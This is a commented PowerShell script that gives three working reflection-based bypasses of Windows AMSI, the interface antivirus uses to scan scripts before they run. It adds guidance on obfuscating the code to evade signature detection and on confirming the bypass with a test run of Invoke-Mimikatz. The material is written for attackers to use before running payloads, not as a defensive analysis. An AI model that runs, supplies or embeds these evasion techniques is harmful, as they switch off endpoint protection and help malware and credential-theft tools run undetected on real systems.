# ============================================================
# AMSI Bypass — PowerShell Reflection Method
# ============================================================
# WHAT IS AMSI?
#   AMSI (Antimalware Scan Interface) is a Windows API that allows
#   AV/EDR products to scan scripts and commands BEFORE execution.
#   When you run a PS script, it gets passed to AMSI which passes
#   it to the registered AV provider (Defender, etc.) for scanning.
#
# WHY THIS WORKS:
#   The AmsiUtils class has a field called 'amsiInitFailed'. When
#   this field is TRUE, AMSI skips scanning because it thinks the
#   AMSI initialization failed. This is by design — if AMSI can't
#   initialize, it fails open (allows execution) to avoid breaking
#   legitimate software.
#
#   We use .NET reflection to:
#     1. Find the System.Management.Automation assembly (PS core)
#     2. Locate the AmsiUtils type
#     3. Find the private static field 'amsiInitFailed'
#     4. Set it to $true
#
# WHEN TO USE:
#   - Run this BEFORE executing any PS payload that AMSI would catch
#   - Must be run in the same PS session where you want bypass
#   - Does NOT persist across PS sessions
#
# LIMITATIONS:
#   - Heavily signatured — the string "amsiInitFailed" may be caught
#   - Won't help if your PS session itself can't run (then use C# loader)
#   - Doesn't bypass CLM (Constrained Language Mode)
# ============================================================

# Method 1: Direct reflection (most common, heavily signatured)
# ---------------------------------------------------------------
# Step-by-step breakdown:
#   [Ref].Assembly          → gets the System.Management.Automation assembly
#   .gettypes()             → gets ALL types in that assembly
#   | ? {$_.Name -like...}  → filters to types whose name matches "Amsi*utils" (AmsiUtils)
#   .GetFields(...)         → gets private, static fields of AmsiUtils
#   | ? {$_.Name -like...}  → filters to the field named "amsiInitFailed"
#   .SetValue($null, $true) → sets the field to $true ($null = static field, no instance needed)
(([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*utils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)


# Method 2: Alternative — patch amsiContext to null (less signatured variant)
# ---------------------------------------------------------------
# This targets a different internal field that stores the AMSI context handle.
# Setting it to 0 (null) causes AMSI scans to fail silently.
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiContext','NonPublic,Static')
$b.SetValue($null,[IntPtr]::Zero)


# Method 3: Force AMSI initialization failure via exception (obfuscated-friendly)
# ---------------------------------------------------------------
# This method avoids the string "amsiInitFailed" by using a different approach.
# It sets amsiSession to null, which causes AMSI to report as uninitialized.
$u = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$f = $u.GetField('amsiSession','NonPublic,Static')
$f.SetValue($null, $null)


# ============================================================
# HOW TO OBFUSCATE (to avoid signature detection):
# ============================================================
# The string "amsiInitFailed" is the signature. Break it up:
#
# Instead of: "amsiInitFailed"
# Use:        "amsiInit" + "Failed"
#
# Instead of: "Amsi*utils"
# Use:        'A'+'m'+'s'+'i'+'*'+'u'+'t'+'i'+'l'+'s'
#
# Or use base64 + IEX:
#   $b = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<base64>'))
#   iex $b
#
# Or use char arrays:
#   $s = [char[]](65,109,115,105,...) -join ''   # builds "AmsiUtils" from char codes
# ============================================================


# ============================================================
# VERIFY BYPASS WORKED:
# ============================================================
# After running the bypass, try running something that would
# normally be caught (without actually running malware):
#
#   'amsicontext'     ← if bypass worked, no error
#   Invoke-Mimikatz   ← would normally be caught
#
# You can also check the field value:
#   $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
#   $b = $a.GetField('amsiInitFailed', 'NonPublic,Static')
#   $b.GetValue($null)   ← should return True if bypass succeeded
# ============================================================
